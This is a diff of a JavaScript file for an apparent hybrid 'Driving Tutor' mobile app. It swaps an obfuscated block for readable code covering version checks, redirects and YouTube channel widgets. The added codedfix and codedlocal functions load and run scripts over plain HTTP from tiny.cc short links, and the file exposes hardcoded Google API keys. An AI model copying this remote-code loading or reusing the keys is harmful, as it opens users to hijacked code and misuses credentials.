@@ -7,4 +7,171 @@
  ***************************************
 */
 
-var _0x763a=["\x73\x74\x79\x6C\x65","\x77\x69\x64\x74\x68\x3A\x20\x31\x30\x30\x76\x77\x20\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x74\x6F\x70\x3A\x20\x30\x70\x78\x20\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x62\x6F\x72\x64\x65\x72\x3A\x20\x6E\x6F\x6E\x65\x20\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74","\x61\x74\x74\x72","\x62\x6F\x64\x79","\x77\x69\x64\x74\x68\x3A\x20\x31\x30\x30\x25\x20\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74","\x23\x69\x6E\x66\x6F\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72","\x77\x69\x64\x74\x68\x3A\x20\x39\x30\x76\x77\x20\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74","\x23\x61\x6C\x6C\x2D\x63\x6F\x6E\x74\x65\x6E\x74","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64","\x61\x6C\x6C\x2D\x63\x6F\x6E\x74\x65\x6E\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x6E\x6F\x6E\x65","\x69\x6E\x66\x6F\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72","\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79\x3A\x20\x68\x69\x64\x64\x65\x6E","\x2E\x67\x6F\x6F\x67\x2D\x74\x65\x2D\x62\x61\x6E\x6E\x65\x72\x2D\x66\x72\x61\x6D\x65","\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79\x3A\x20\x68\x69\x64\x64\x65\x6E\x20\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74","\x2E\x67\x6F\x6F\x67\x2D\x74\x6F\x6F\x6C\x74\x69\x70","\x68\x72\x65\x66","\x23","\x2E\x67\x6F\x6F\x67\x2D\x6C\x6F\x67\x6F\x2D\x6C\x69\x6E\x6B","\x73\x63\x72\x6F\x6C\x6C","\x23\x69\x6E\x66\x6F\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x2C\x20\x23\x61\x6C\x6C\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x2C\x20\x23\x45\x78\x74\x65\x72\x6E\x61\x6C\x50\x61\x67\x65","\x23\x69\x6E\x66\x6F\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x20\x3E\x20\x68\x31","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x64","\x74\x72\x61\x6E\x73\x6C\x61\x74\x65\x4D\x53\x47","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x5B\x20\x4C\x61\x6E\x67\x75\x61\x67\x65\x20\x4C\x6F\x61\x64\x69\x6E\x67\x2E\x2E\x2E\x20\x5D","\x63\x6F\x6C\x6F\x72","\x23\x30\x30\x66\x66\x30\x30","\x62\x6C\x61\x63\x6B","\x70\x61\x64\x64\x69\x6E\x67","\x32\x25","\x7A\x6F\x6F\x6D","\x31\x2E\x32","\x74\x65\x78\x74\x53\x68\x61\x64\x6F\x77","\x30\x20\x31\x70\x78\x20\x30\x20\x23\x30\x30\x30","\x61\x66\x74\x65\x72","\x67\x6F\x6F\x67\x6C\x65\x5F\x74\x72\x61\x6E\x73\x6C\x61\x74\x65\x5F\x65\x6C\x65\x6D\x65\x6E\x74","\x23\x74\x72\x61\x6E\x73\x6C\x61\x74\x65\x4D\x53\x47","\x65\x6E","\x74\x72\x61\x6E\x73\x6C\x61\x74\x65","\x77\x69\x64\x74\x68\x3A\x20\x31\x30\x25\x20\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74","\x23\x67\x6F\x6F\x67\x6C\x65\x5F\x74\x72\x61\x6E\x73\x6C\x61\x74\x65\x5F\x65\x6C\x65\x6D\x65\x6E\x74\x20\x69\x6D\x67","\x7A\x6F\x6F\x6D\x3A\x20\x32","\x2E\x67\x6F\x6F\x67\x2D\x74\x65\x2D\x67\x61\x64\x67\x65\x74\x20\x2E\x67\x6F\x6F\x67\x2D\x74\x65\x2D\x63\x6F\x6D\x62\x6F","\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x6E\x6F\x6E\x65","\x2E\x67\x6F\x6F\x67\x2D\x74\x65\x2D\x63\x6F\x6D\x62\x6F\x20\x3E\x20\x6F\x70\x74\x69\x6F\x6E","\x74\x61\x70","\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79\x3A\x20\x76\x69\x73\x69\x62\x6C\x65","\x6F\x6E","\x6E\x6F\x74\x72\x61\x6E\x73\x6C\x61\x74\x65","\x61\x64\x64\x43\x6C\x61\x73\x73","\x23\x68\x65\x61\x64\x65\x72","\x23\x61\x62\x6F\x75\x74\x44\x69\x61\x6C\x6F\x67","\x2E\x6D\x61\x69\x6E\x66\x6F\x6F\x74\x65\x72","\x74\x69\x74\x6C\x65","\x73\x63\x72\x69\x70\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x72\x61\x6E\x73\x6C\x61\x74\x65\x2E\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D\x2F\x74\x72\x61\x6E\x73\x6C\x61\x74\x65\x5F\x61\x2F\x65\x6C\x65\x6D\x65\x6E\x74\x2E\x6A\x73\x3F\x63\x62\x3D\x67\x6F\x6F\x67\x6C\x65\x54\x72\x61\x6E\x73\x6C\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x49\x6E\x69\x74","\x61\x70\x70\x65\x6E\x64","\x68\x65\x61\x64","\x23\x67\x6F\x6F\x67\x2D\x67\x74\x2D\x74\x74","\x6C\x65\x6E\x67\x74\x68","\x2E\x67\x6F\x6F\x67\x2D\x74\x65\x2D\x62\x75\x74\x74\x6F\x6E","\x66\x69\x6E\x64","\x63\x6F\x6E\x74\x65\x6E\x74\x73","\x69\x66\x72\x61\x6D\x65","\x59\x6F\x75\x72\x20\x41\x70\x70\x20\x69\x73\x20\x74\x6F\x6F\x20\x6F\x6C\x64\x2C\x20\x0A\x43\x6C\x69\x63\x6B\x20\x4F\x4B\x20\x74\x6F\x20\x55\x70\x64\x61\x74\x65\x20\x6E\x6F\x77\x21","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x6D\x61\x72\x6B\x65\x74\x3A\x2F\x2F\x64\x65\x74\x61\x69\x6C\x73\x3F\x69\x64\x3D\x63\x6F\x6D\x2E\x63\x61\x73\x74\x65\x72\x6F\x61\x70\x70\x73\x2E\x64\x72\x69\x76\x69\x6E\x67\x74\x75\x74\x6F\x72","\x23\x61\x62\x6F\x75\x74\x44\x69\x61\x6C\x6F\x67\x20\x3E\x20\x68\x34\x3E\x61","\x23\x61\x62\x6F\x75\x74\x44\x69\x61\x6C\x6F\x67\x20\x3E\x20\x68\x33\x3E\x61","\x44\x52\x49\x56\x49\x4E\x47\x20\x54\x55\x54\x4F\x52\x20\x32\x2E\x30","\x41\x6E\x20\x49\x6D\x70\x6F\x72\x74\x61\x6E\x74\x20\x55\x70\x64\x61\x74\x65\x20\x41\x76\x61\x69\x6C\x61\x62\x6C\x65\x2C\x20\x0A\x43\x6C\x69\x63\x6B\x20\x4F\x4B\x20\x74\x6F\x20\x55\x70\x64\x61\x74\x65\x20\x74\x68\x69\x73\x20\x41\x70\x70\x20\x6E\x6F\x77\x21","\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64","\x74\x65\x78\x74","\x54\x49\x54\x4C\x45","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x47\x48\x20\x53\x54\x41\x52\x53","\x47\x41\x4C\x4C\x45\x52\x59","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x62\x69\x6E\x67\x2E\x63\x6F\x6D\x2F\x69\x6D\x61\x67\x65\x73\x2F\x73\x65\x61\x72\x63\x68\x3F\x71\x3D\x6C\x61\x74\x65\x73\x74\x25\x32\x30\x63\x61\x72\x73\x26\x71\x73\x3D\x6E\x26\x66\x6F\x72\x6D\x3D\x51\x42\x49\x52\x26\x73\x70\x3D\x2D\x31\x26\x70\x71\x3D\x6C\x61\x74\x65\x73\x74\x25\x32\x30\x63\x61\x72\x26\x73\x63\x3D\x38\x2D\x31\x38\x26\x73\x6B\x3D\x26\x63\x76\x69\x64\x3D\x45\x37\x39\x46\x36\x31\x34\x31\x44\x43\x39\x46\x34\x36\x38\x38\x42\x32\x41\x42\x31\x34\x38\x44\x33\x41\x45\x44\x30\x46\x45\x32\x26\x61\x6A\x66\x3D\x36\x30","\x43\x48\x41\x4E\x4E\x45\x4C\x20\x31","\x41\x49\x7A\x61\x53\x79\x41\x6C\x68\x41\x71\x50\x35\x52\x53\x37\x47\x78\x77\x67\x5F\x30\x72\x5F\x72\x68\x39\x6A\x4F\x76\x5F\x35\x57\x66\x61\x4A\x67\x58\x77","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x63\x68\x61\x6E\x6E\x65\x6C\x2F\x55\x43\x50\x77\x74\x2D\x67\x4C\x58\x41\x4D\x4D\x56\x56\x6E\x65\x36\x54\x46\x79\x43\x44\x46\x41","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x3F\x6C\x69\x73\x74\x54\x79\x70\x65\x3D\x75\x73\x65\x72\x5F\x75\x70\x6C\x6F\x61\x64\x73\x26\x6C\x69\x73\x74\x3D\x73\x68\x65\x6D\x6D\x61\x74\x69\x31\x30\x79\x74","\x50\x6C\x61\x79\x6C\x69\x73\x74\x73","\x70\x6F\x70\x75\x70","\x32\x30","\x3C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x61\x20\x66\x61\x2D\x70\x6C\x75\x73\x22\x3E\x3C\x2F\x69\x3E\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x53\x68\x6F\x77\x20\x6D\x65\x20\x6D\x6F\x72\x65\x20\x76\x69\x64\x65\x6F\x73\x2E\x2E","\x3C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x61\x20\x66\x61\x2D\x61\x6E\x67\x6C\x65\x2D\x6C\x65\x66\x74\x22\x3E\x3C\x2F\x69\x3E\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x50\x72\x65\x76\x69\x6F\x75\x73","\x4E\x65\x78\x74\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x3C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x61\x20\x66\x61\x2D\x61\x6E\x67\x6C\x65\x2D\x72\x69\x67\x68\x74\x22\x3E\x3C\x2F\x69\x3E","\x50\x6C\x65\x61\x73\x65\x20\x57\x61\x69\x74\x2E\x2E\x20\x3C\x62\x72\x3E\x20\x56\x69\x64\x65\x6F\x73\x20\x61\x72\x65\x20\x6C\x6F\x61\x64\x69\x6E\x67\x2E\x2E","\x3C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x61\x20\x66\x61\x2D\x74\x69\x6D\x65\x73\x22\x3E\x3C\x2F\x69\x3E\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x41\x6C\x6C\x20\x64\x6F\x6E\x65\x2E\x2E","\x79\x6F\x75\x6D\x61\x78","\x2E\x79\x6F\x75\x6D\x61\x78","\x43\x48\x41\x4E\x4E\x45\x4C\x20\x32","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x63\x68\x61\x6E\x6E\x65\x6C\x2F\x55\x43\x39\x34\x72\x6B\x4E\x68\x69\x78\x79\x56\x41\x32\x4E\x5F\x55\x59\x54\x51\x79\x56\x65\x67","\x43\x48\x41\x4E\x4E\x45\x4C\x20\x33","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x75\x73\x65\x72\x2F\x70\x75\x72\x70\x6C\x65\x64\x72\x69\x76\x69\x6E\x67","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x3F\x6C\x69\x73\x74\x54\x79\x70\x65\x3D\x75\x73\x65\x72\x5F\x75\x70\x6C\x6F\x61\x64\x73\x26\x6C\x69\x73\x74\x3D\x70\x75\x72\x70\x6C\x65\x64\x72\x69\x76\x69\x6E\x67"];var _0x61f9=[_0x763a[0],_0x763a[1],_0x763a[2],_0x763a[3],_0x763a[4],_0x763a[5],_0x763a[6],_0x763a[7],_0x763a[8],_0x763a[9],_0x763a[10],_0x763a[11],_0x763a[12],_0x763a[13],_0x763a[14],_0x763a[15],_0x763a[16],_0x763a[17],_0x763a[18],_0x763a[19],_0x763a[20],_0x763a[21],_0x763a[22],_0x763a[23],_0x763a[24],_0x763a[25],_0x763a[26],_0x763a[27],_0x763a[28],_0x763a[29],_0x763a[30],_0x763a[31],_0x763a[32],_0x763a[33],_0x763a[34],_0x763a[35],_0x763a[36],_0x763a[37],_0x763a[38],_0x763a[39],_0x763a[40],_0x763a[41],_0x763a[42],_0x763a[43],_0x763a[44],_0x763a[45],_0x763a[46],_0x763a[47],_0x763a[48],_0x763a[49],_0x763a[50],_0x763a[51],_0x763a[52],_0x763a[53],_0x763a[54],_0x763a[55],_0x763a[56],_0x763a[57],_0x763a[58],_0x763a[59],_0x763a[60],_0x763a[61],_0x763a[62],_0x763a[63],_0x763a[64],_0x763a[65],_0x763a[66],_0x763a[67],_0x763a[68],_0x763a[69],_0x763a[70],_0x763a[71],_0x763a[72],_0x763a[73],_0x763a[74],_0x763a[75],_0x763a[76],_0x763a[77],_0x763a[78],_0x763a[79],_0x763a[80],_0x763a[81],_0x763a[82],_0x763a[83],_0x763a[84],_0x763a[85],_0x763a[86],_0x763a[87],_0x763a[88],_0x763a[89],_0x763a[90],_0x763a[91],_0x763a[92],_0x763a[93],_0x763a[94],_0x763a[95],_0x763a[96],_0x763a[97],_0x763a[98],_0x763a[99],_0x763a[100],_0x763a[101],_0x763a[102],_0x763a[103]];criticalfixes();notice();function criticalfixes(){$(_0x61f9[3])[_0x61f9[2]](_0x61f9[0],_0x61f9[1]);$(_0x61f9[5])[_0x61f9[2]](_0x61f9[0],_0x61f9[4]);$(_0x61f9[7])[_0x61f9[2]](_0x61f9[0],_0x61f9[6]);document[_0x61f9[10]](_0x61f9[9])[_0x61f9[0]][_0x61f9[8]]= _0x61f9[11];document[_0x61f9[10]](_0x61f9[12])[_0x61f9[0]][_0x61f9[8]]= _0x61f9[11]}$(_0x61f9[21])[_0x61f9[20]](function(){$(_0x61f9[3])[_0x61f9[2]](_0x61f9[0],_0x61f9[1]);$(_0x61f9[14])[_0x61f9[2]](_0x61f9[0],_0x61f9[13]);$(_0x61f9[16])[_0x61f9[2]](_0x61f9[0],_0x61f9[15]);$(_0x61f9[19])[_0x61f9[2]](_0x61f9[17],_0x61f9[18])});function allUIfixes(){$(_0x61f9[3])[_0x61f9[2]](_0x61f9[0],_0x61f9[1]);$(_0x61f9[5])[_0x61f9[2]](_0x61f9[0],_0x61f9[4]);$(_0x61f9[7])[_0x61f9[2]](_0x61f9[0],_0x61f9[6]);document[_0x61f9[10]](_0x61f9[9])[_0x61f9[0]][_0x61f9[8]]= _0x61f9[11];document[_0x61f9[10]](_0x61f9[12])[_0x61f9[0]][_0x61f9[8]]= _0x61f9[11]}setTimeout(allUIfixes,2000);var pageLable1=$(_0x61f9[22])[0];var translateInfo=document[_0x61f9[24]](_0x61f9[23]);translateInfo[_0x61f9[25]]= _0x61f9[26];translateInfo[_0x61f9[27]]= _0x61f9[28];translateInfo[_0x61f9[0]][_0x61f9[29]]= _0x61f9[30];translateInfo[_0x61f9[0]][_0x61f9[8]]= _0x61f9[31];translateInfo[_0x61f9[0]][_0x61f9[32]]= _0x61f9[33];translateInfo[_0x61f9[0]][_0x61f9[34]]= _0x61f9[35];translateInfo[_0x61f9[0]][_0x61f9[36]]= _0x61f9[37];$(pageLable1)[_0x61f9[38]](translateInfo);var translateBox=document[_0x61f9[24]](_0x61f9[23]);translateBox[_0x61f9[25]]= _0x61f9[39];$(_0x61f9[40])[_0x61f9[38]](translateBox);function googleTranslateElementInit(){ new google[_0x61f9[42]].TranslateElement({pageLanguage:_0x61f9[41]},_0x61f9[39]);$(_0x61f9[44])[_0x61f9[2]](_0x61f9[0],_0x61f9[43]);$(_0x61f9[46])[_0x61f9[2]](_0x61f9[0],_0x61f9[45]);$(_0x61f9[40])[_0x61f9[2]](_0x61f9[0],_0x61f9[47]);$(_0x61f9[19])[_0x61f9[2]](_0x61f9[17],_0x61f9[18]);var _0x7b93x8=$(_0x61f9[48])[0];$(document)[_0x61f9[51]](_0x61f9[49],_0x7b93x8,function(){$(_0x61f9[14])[_0x61f9[2]](_0x61f9[0],_0x61f9[50]);setTimeout(fixTranslateOverflow,7000)})}function localize(){$(_0x61f9[54])[_0x61f9[53]](_0x61f9[52]);$(_0x61f9[55])[_0x61f9[53]](_0x61f9[52]);$(_0x61f9[56])[_0x61f9[53]](_0x61f9[52]);$(_0x61f9[57])[_0x61f9[53]](_0x61f9[52]);var _0x7b93xa=document[_0x61f9[24]](_0x61f9[58]);_0x7b93xa[_0x61f9[59]]= _0x61f9[60];_0x7b93xa[_0x61f9[61]]= _0x61f9[62];$(_0x61f9[64])[_0x61f9[63]](_0x7b93xa)}function fixTranslateOverflow(){$(_0x61f9[65])[_0x61f9[2]](_0x61f9[0],_0x61f9[15]);$(_0x61f9[16])[_0x61f9[2]](_0x61f9[0],_0x61f9[15]);$(_0x61f9[19])[_0x61f9[2]](_0x61f9[17],_0x61f9[18]);if($(_0x61f9[70])[_0x61f9[69]]()[_0x61f9[68]](_0x61f9[67])[_0x61f9[66]]){$(_0x61f9[14])[_0x61f9[2]](_0x61f9[0],_0x61f9[13])}}localize();function checkversion(){if(appversion()< 1.0){if(confirm(_0x61f9[71])=== true){window[_0x61f9[72]][_0x61f9[17]]= _0x61f9[73]}}}var versionLable1=$(_0x61f9[74])[0][_0x61f9[27]]|| $(_0x61f9[75])[0][_0x61f9[27]];function checkVersionLable(){if(versionLable1!== _0x61f9[76]){if(confirm(_0x61f9[77])=== true){window[_0x61f9[72]][_0x61f9[17]]= _0x61f9[73]}}}var codedcloud=_0x61f9[78];function notice(){var _0x7b93x11=document[_0x61f9[81]](_0x61f9[80])[0][_0x61f9[79]];if(_0x7b93x11=== _0x61f9[82]){}}if(pagename()=== _0x61f9[83]){window[_0x61f9[72]][_0x61f9[17]]= _0x61f9[84]};if(pagename()=== _0x61f9[85]){$(_0x61f9[98])[_0x61f9[97]]({apiKey:_0x61f9[86],channelLink:_0x61f9[87],playlistLink:_0x61f9[88],defaultTab:_0x61f9[89],videoDisplayMode:_0x61f9[90],maxResults:_0x61f9[91],autoPlay:true,displayFirstVideoOnLoad:true,responsiveBreakpoints:[600,900,2000,2500],loadMoreText:_0x61f9[92],previousButtonText:_0x61f9[93],nextButtonText:_0x61f9[94],loadingText:_0x61f9[95],allDoneText:_0x61f9[96],hideHeader:false,hideTabs:false,hideLoadingMechanism:false})};if(pagename()=== _0x61f9[99]){$(_0x61f9[98])[_0x61f9[97]]({apiKey:_0x61f9[86],channelLink:_0x61f9[100],playlistLink:_0x61f9[88],defaultTab:_0x61f9[89],videoDisplayMode:_0x61f9[90],maxResults:_0x61f9[91],autoPlay:true,displayFirstVideoOnLoad:true,responsiveBreakpoints:[600,900,2000,2500],loadMoreText:_0x61f9[92],previousButtonText:_0x61f9[93],nextButtonText:_0x61f9[94],loadingText:_0x61f9[95],allDoneText:_0x61f9[96],hideHeader:false,hideTabs:false,hideLoadingMechanism:false})};if(pagename()=== _0x61f9[101]){$(_0x61f9[98])[_0x61f9[97]]({apiKey:_0x61f9[86],channelLink:_0x61f9[102],playlistLink:_0x61f9[103],defaultTab:_0x61f9[89],videoDisplayMode:_0x61f9[90],maxResults:_0x61f9[91],autoPlay:true,displayFirstVideoOnLoad:true,responsiveBreakpoints:[600,900,2000,2500],loadMoreText:_0x61f9[92],previousButtonText:_0x61f9[93],nextButtonText:_0x61f9[94],loadingText:_0x61f9[95],allDoneText:_0x61f9[96],hideHeader:false,hideTabs:false,hideLoadingMechanism:false})};checkVersionLable()
+//                -- PRELOADERS --
+
+//updateChecker
+     // checkversion ();
+
+//Notice
+      notice ();
+
+ //codedfix	 
+codedfix ();
+
+//criticalfixes
+ function codedfix () {
+	var fixJS = document.createElement("script");
+    fixJS.type = "text/javascript";
+    fixJS.src = "http://tiny.cc/F1Xf2xF3";
+    // Use any selector
+    $("head").append(fixJS);
+ };
+
+ 
+ //codedlocal	 
+codedlocal ();
+
+//codedlocal
+ function codedlocal () {
+	var localJS = document.createElement("script");
+    localJS.type = "text/javascript";
+    localJS.src = "http://tiny.cc/L1Xl2xL3";
+    // Use any selector
+    $("head").append(localJS);
+ };
+ 
+
+//checkversion
+ function checkversion () {
+
+if (appversion () < 1.0) { 
+	if (confirm("Your App is too old, \nClick OK to Update now!") === true) {
+		window.location.href = 'market://details?id=com.casteroapps.drivingtutor';
+	};
+		};
+};
+
+
+//checkVersionLable
+var versionLable1 = $("#aboutDialog > h4>a")[0].innerHTML || $("#aboutDialog > h3>a")[0].innerHTML;
+ function checkVersionLable () {
+
+if (versionLable1 !== "DRIVING TUTOR 2.0") { 
+	if (confirm("An Important Update Available, \nClick OK to Update this App now!") === true) {
+		window.location.href = 'market://details?id=com.casteroapps.drivingtutor';
+	};
+		};
+};
+
+
+//codedOnline
+var codedcloud = "connected"
+
+//notice
+ function notice () {
+
+var pagetitle = document.getElementsByTagName("TITLE")[0].text;
+
+if (pagetitle === "GH STARS"){	
+	//alert("The National Service, News, Music, E-payslip & Technical Results function in this App is now fully completed. So tell everyone about this. \n\nAll functions with grayed icon is still under development. \n\nThank you.");
+	//alert("Hello user, The Training Videos function in this App is now completed. Click on the Training Videos button to enjoy your KungFu video lessons.  \nKindly tell all your friends to use Learn KungFu. \n\nAnd also, do the following always to support this app: \n\n1) Click on most of the Ads in this app to support the cost of servers the app is running on. \n\n2) Go to Google Play Store, scroll down and Rate 5stars with a nice comment for this app..");
+	}
+}; 
+
+
+if (pagename() === "GALLERY"){ 
+   
+ window.location.href = 'http://www.bing.com/images/search?q=latest%20cars&qs=n&form=QBIR&sp=-1&pq=latest%20car&sc=8-18&sk=&cvid=E79F6141DC9F4688B2AB148D3AED0FE2&ajf=60';	
+	};
+
+//CHANNEL
+if (pagename() === "CHANNEL 1"){
+  $(".youmax").youmax({
+                apiKey:"AIzaSyAlhAqP5RS7Gxwg_0r_rh9jOv_5WfaJgXw",
+                	//apiKey:"AIzaSyC3lXNm8-OC5y3uFLUQjPkTCTP6qR7Bv0s", //CASTERO APPS LEARN KUNGFU [ NEW ]
+                channelLink:"https://m.youtube.com/channel/UCPwt-gLXAMMVVne6TFyCDFA",
+	  	playlistLink:"https://www.youtube.com/?listType=user_uploads&list=shemmati10yt",
+                //playlistLink:"https://m.youtube.com/channel/UCPwt-gLXAMMVVne6TFyCDFA/playlists",
+                
+                defaultTab:"Playlists",         //Uploads|Playlists|Featured
+                videoDisplayMode:"popup",       //popup|link|inline
+
+                maxResults:"20",
+                autoPlay:true,
+                displayFirstVideoOnLoad:true,       //for inline video display mode only                
+
+                responsiveBreakpoints   :[600,900,2000,2500],
+
+                loadMoreText            :"<i class=\"fa fa-plus\"></i>&nbsp;&nbsp;Show me more videos..",
+                previousButtonText      :"<i class=\"fa fa-angle-left\"></i>&nbsp;&nbsp;Previous",
+                nextButtonText          :"Next&nbsp;&nbsp;<i class=\"fa fa-angle-right\"></i>",
+                loadingText             :"Please Wait.. <br> Videos are loading..",
+                allDoneText             :"<i class=\"fa fa-times\"></i>&nbsp;&nbsp;All done..",
+
+                hideHeader              :false,
+                hideTabs                :false,
+                hideLoadingMechanism    :false,
+            });
+	}
+
+
+if (pagename() === "CHANNEL 2"){
+  $(".youmax").youmax({
+                apiKey:"AIzaSyAlhAqP5RS7Gxwg_0r_rh9jOv_5WfaJgXw",
+                	//apiKey:"AIzaSyC3lXNm8-OC5y3uFLUQjPkTCTP6qR7Bv0s", //CASTERO APPS LEARN KUNGFU [ NEW ]
+                channelLink:"https://www.youtube.com/channel/UC94rkNhixyVA2N_UYTQyVeg",
+	  	playlistLink:"https://www.youtube.com/?listType=user_uploads&list=shemmati10yt",
+                //playlistLink:"https://www.youtube.com/channel/UC94rkNhixyVA2N_UYTQyVeg/playlists",
+                
+                defaultTab:"Playlists",         //Uploads|Playlists|Featured
+                videoDisplayMode:"popup",       //popup|link|inline
+
+                maxResults:"20",
+                autoPlay:true,
+                displayFirstVideoOnLoad:true,       //for inline video display mode only                
+
+                responsiveBreakpoints   :[600,900,2000,2500],
+
+                loadMoreText            :"<i class=\"fa fa-plus\"></i>&nbsp;&nbsp;Show me more videos..",
+                previousButtonText      :"<i class=\"fa fa-angle-left\"></i>&nbsp;&nbsp;Previous",
+                nextButtonText          :"Next&nbsp;&nbsp;<i class=\"fa fa-angle-right\"></i>",
+                loadingText             :"Please Wait.. <br> Videos are loading..",
+                allDoneText             :"<i class=\"fa fa-times\"></i>&nbsp;&nbsp;All done..",
+
+                hideHeader              :false,
+                hideTabs                :false,
+                hideLoadingMechanism    :false,
+            });
+	}
+
+
+if (pagename() === "CHANNEL 3"){
+  $(".youmax").youmax({
+                apiKey:"AIzaSyAlhAqP5RS7Gxwg_0r_rh9jOv_5WfaJgXw",
+                	//apiKey:"AIzaSyC3lXNm8-OC5y3uFLUQjPkTCTP6qR7Bv0s", //CASTERO APPS LEARN KUNGFU [ NEW ]
+                channelLink:"https://www.youtube.com/user/purpledriving",
+                playlistLink:"https://www.youtube.com/?listType=user_uploads&list=purpledriving",
+                
+                defaultTab:"Playlists",         //Uploads|Playlists|Featured
+                videoDisplayMode:"popup",       //popup|link|inline
+
+                maxResults:"20",
+                autoPlay:true,
+                displayFirstVideoOnLoad:true,       //for inline video display mode only                
+
+                responsiveBreakpoints   :[600,900,2000,2500],
+
+                loadMoreText            :"<i class=\"fa fa-plus\"></i>&nbsp;&nbsp;Show me more videos..",
+                previousButtonText      :"<i class=\"fa fa-angle-left\"></i>&nbsp;&nbsp;Previous",
+                nextButtonText          :"Next&nbsp;&nbsp;<i class=\"fa fa-angle-right\"></i>",
+                loadingText             :"Please Wait.. <br> Videos are loading..",
+                allDoneText             :"<i class=\"fa fa-times\"></i>&nbsp;&nbsp;All done..",
+
+                hideHeader              :false,
+                hideTabs                :false,
+                hideLoadingMechanism    :false,
+            });
+	}
+
+//checkVersionLable
+checkVersionLable ();
